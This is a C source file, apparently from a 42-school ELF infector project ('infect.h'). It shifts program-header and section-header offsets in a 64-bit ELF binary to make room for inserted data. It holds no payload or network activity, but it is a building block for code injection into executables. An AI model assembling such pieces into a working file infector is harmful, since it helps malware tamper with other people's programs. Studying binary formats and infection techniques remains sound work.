/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   adjust_references.c                                :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/05/13 14:56:28 by agrumbac          #+#    #+#             */
/*   Updated: 2019/12/19 00:36:26 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infect.h"
#include "errors.h"

struct		data
{
	size_t	shift_amount;
	size_t	end_last_sect;
};

static bool	shift_phdr_position(struct safe_pointer info, const size_t offset, void *data)
{
	struct data	*closure = data;
	Elf64_Phdr	*phdr    = safe(offset, sizeof(Elf64_Phdr));

	if (phdr == NULL) return errors(ERR_FILE, _ERR_BAD_PHDR_OFF);

	Elf64_Off	p_offset = phdr->p_offset;

	if (p_offset > closure->end_last_sect)
	{
		p_offset      += closure->shift_amount;
		phdr->p_offset = p_offset;
	}
	return true;
}

static bool	shift_shdr_position(struct safe_pointer info, const size_t offset, void *data)
{
	struct data 	*closure = data;
	Elf64_Shdr	*shdr    = safe(offset, sizeof(Elf64_Shdr));

	if (shdr == NULL) return errors(ERR_FILE, _ERR_BAD_SHDR_OFF);

	Elf64_Off	sh_offset = shdr->sh_offset;

	if (sh_offset > closure->end_last_sect)
	{
		sh_offset      += closure->shift_amount;
		shdr->sh_offset = sh_offset;
	}
	return true;
}

static void	adjust_phdr_table_offset(Elf64_Ehdr *safe_elf_hdr, size_t shift_amount, size_t end_last_sect)
{
	Elf64_Off	e_phoff = safe_elf_hdr->e_phoff;

	if (e_phoff < end_last_sect)
		return;

	e_phoff              += shift_amount;
	safe_elf_hdr->e_phoff = e_phoff;
}

static void	adjust_shdr_table_offset(Elf64_Ehdr *safe_elf_hdr, size_t shift_amount, size_t end_last_sect)
{
	Elf64_Off	e_shoff = safe_elf_hdr->e_shoff;

	if (e_shoff < end_last_sect)
		return;

	e_shoff              += shift_amount;
	safe_elf_hdr->e_shoff = e_shoff;
}

bool		adjust_references(const struct safe_pointer info, size_t shift_amount, const struct entry *original_entry)
{
	struct data	closure;

	if (shift_amount == 0)
		return true;

	closure.shift_amount  = shift_amount;
	closure.end_last_sect = original_entry->end_of_last_section;

	Elf64_Ehdr	*elf_hdr = safe(0, sizeof(Elf64_Ehdr));

	if (elf_hdr == NULL) return errors(ERR_FILE, _ERR_CANT_READ_ELFHDR);

	adjust_phdr_table_offset(elf_hdr, shift_amount, closure.end_last_sect);
	adjust_shdr_table_offset(elf_hdr, shift_amount, closure.end_last_sect);

	if (!foreach_phdr(info, shift_phdr_position, &closure))
		return errors(ERR_THROW, _ERR_ADJUST_REFERENCES);
	if (!foreach_shdr(info, shift_shdr_position, &closure))
		return errors(ERR_THROW, _ERR_ADJUST_REFERENCES);

	return true;
}
